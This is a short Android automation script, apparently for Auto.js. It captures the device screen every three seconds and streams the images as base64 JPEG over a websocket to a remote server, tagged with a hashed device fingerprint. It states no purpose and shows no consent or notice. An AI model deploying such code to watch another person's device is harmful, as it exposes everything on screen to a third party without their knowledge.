var websocket = require('./server/websocket.js');
var uuid = device.fingerprint;
var ws = websocket.getInstance();
function md5(string) {
    var res = java.math.BigInteger(1, java.security.MessageDigest.getInstance("MD5").digest(java.lang.String(string).getBytes())).toString(16);
    while (res.length < 32) res = "0" + res;
    return res;
}

threads.start(function () {
    setInterval(() => {
        var img = captureScreen();
        var base64 = images.toBase64(img, format = "jpeg", quality = 3);
        ws.send(`{
            "fromUserId":"${md5(uuid)}",
            "toUserId":"server123",
            "text":"data:image/jpeg;base64,${base64}",
            "time":"${new Date().getTime()}"}`
        );
        img.recycle();
    }, 3000)
});